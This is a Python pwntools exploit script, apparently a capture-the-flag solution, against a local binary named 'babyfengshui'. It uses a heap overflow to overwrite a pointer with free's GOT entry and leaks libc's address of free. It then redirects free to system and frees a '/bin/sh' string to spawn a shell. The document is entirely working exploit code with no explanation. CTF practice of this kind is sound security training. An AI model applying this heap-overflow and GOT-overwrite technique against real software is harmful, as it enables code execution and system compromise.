from pwn import *

context.log_level='debug'

elf=ELF("./babyfengshui")
io=process("./babyfengshui")
libc=elf.libc

def my_add(size, name, len, text):
    io.recvuntil('Action: ')
    io.sendline('0')
    io.recvuntil('size of description: ')
    io.sendline(str(size))
    io.recvuntil('name: ')
    io.sendline(name)
    io.recvuntil('text length: ')
    io.sendline(str(len))
    io.recvuntil('text: ')
    io.sendline(text)


def delete(index):
    io.recvuntil('Action: ')
    io.sendline('1')
    io.recvuntil('index: ')
    io.sendline(str(index))


def show(index):
    io.recvuntil('Action: ')
    io.sendline('2')
    io.recvuntil('index: ')
    io.sendline(str(index))


def edit(index, len, text):
    io.recvuntil('Action: ')
    io.sendline('3')
    io.recvuntil('index: ')
    io.sendline(str(index))
    io.recvuntil('text length: ')
    io.sendline(str(len))
    io.recvuntil('text: ')
    io.sendline(text)


my_add(128,"aaaa",10,"aaaa")
my_add(128,"bbbb",10,"bbbb")
my_add(128,"cccc",10,"/bin/sh\x00")
delete(0)
#gdb.attach(io, "b *0x8048A70")
#io.interactive()

payload=(0x1a0-8)*'a'+p32(elf.got['free'])
my_add(256,"dddd",len(payload),payload)

show(1)
io.recvuntil("description: ")
free_addr=u32(io.recv(4))
offset=free_addr-libc.symbols["free"]
sys_addr=offset+libc.symbols["system"]

edit(1,4,p32(sys_addr))

delete(2)

io.interactive()